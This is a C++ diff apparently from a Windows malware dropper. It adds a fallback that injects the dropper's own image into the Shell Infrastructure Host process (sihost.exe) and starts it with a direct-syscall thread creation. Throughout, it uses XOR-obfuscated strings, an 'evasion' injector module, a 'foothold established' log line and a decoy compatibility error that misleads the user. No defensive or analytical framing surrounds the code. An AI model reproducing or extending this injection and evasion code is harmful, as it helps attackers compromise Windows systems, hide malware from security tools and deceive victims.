@@ -25,6 +25,7 @@ namespace {
     const wchar_t kVolatileEnvEnc[] = { 'V'^0x4B, 'o'^0x1F, 'l'^0x8C, 'a'^0x3E, 't'^0x4B, 'i'^0x1F, 'l'^0x8C, 'e'^0x3E, ' '^0x4B, 'E'^0x1F, 'n'^0x8C, 'v'^0x3E, 'i'^0x4B, 'r'^0x1F, 'o'^0x8C, 'n'^0x3E, 'm'^0x4B, 'e'^0x1F, 'n'^0x8C, 't'^0x3E }; // Volatile Environment
     const wchar_t kDropperPathEnc[] = { 'D'^0x4B, 'r'^0x1F, 'o'^0x8C, 'p'^0x3E, 'p'^0x4B, 'e'^0x1F, 'r'^0x8C, 'P'^0x3E, 'a'^0x4B, 't'^0x1F, 'h'^0x8C }; // DropperPath
     const wchar_t kRuntimeBrokerEnc[] = { 'R'^0x4B, 'u'^0x1F, 'n'^0x8C, 't'^0x3E, 'i'^0x4B, 'm'^0x1F, 'e'^0x8C, 'B'^0x3E, 'r'^0x4B, 'o'^0x1F, 'k'^0x8C, 'e'^0x3E, 'r'^0x4B, '.'^0x1F, 'e'^0x8C, 'x'^0x3E, 'e'^0x4B }; // RuntimeBroker.exe
+    const wchar_t kSihostEnc[] = { 's'^0x4B, 'i'^0x1F, 'h'^0x8C, 'o'^0x3E, 's'^0x4B, 't'^0x1F, '.'^0x8C, 'e'^0x3E, 'x'^0x4B, 'e'^0x1F }; // sihost.exe
 
     std::vector<uint8_t> GetSelfImage() {
         wchar_t path[MAX_PATH];
@@ -166,6 +167,31 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             decoy::ShowCompatibilityError();
             CoUninitialize();
             return 0;
+        }
+
+        // Fallback: Try sihost.exe (Shell Infrastructure Host)
+        std::wstring sihost = utils::DecryptW(kSihostEnc, 10);
+        DWORD siPid = evasion::Injector::GetProcessIdByName(sihost);
+        if (siPid != 0) {
+            HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, siPid);
+            if (hProc) {
+                PVOID pRemoteBase = NULL;
+                if (evasion::Injector::MapAndInject(hProc, selfImage, &pRemoteBase)) {
+                    PBYTE pSrcData = (PBYTE)selfImage.data();
+                    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pSrcData + ((PIMAGE_DOS_HEADER)pSrcData)->e_lfanew);
+                    PVOID pEntry = (PVOID)((PBYTE)pRemoteBase + pNt->OptionalHeader.AddressOfEntryPoint);
+                    HANDLE hThread = NULL;
+                    if (NT_SUCCESS(evasion::SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, pEntry, NULL, 0, 0, 0, 0, NULL))) {
+                        CloseHandle(hThread);
+                        LOG_INFO("Dropper: Foothold established in sihost.exe.");
+                        CloseHandle(hProc);
+                        decoy::ShowCompatibilityError();
+                        CoUninitialize();
+                        return 0;
+                    }
+                }
+                CloseHandle(hProc);
+            }
         }
     }
 
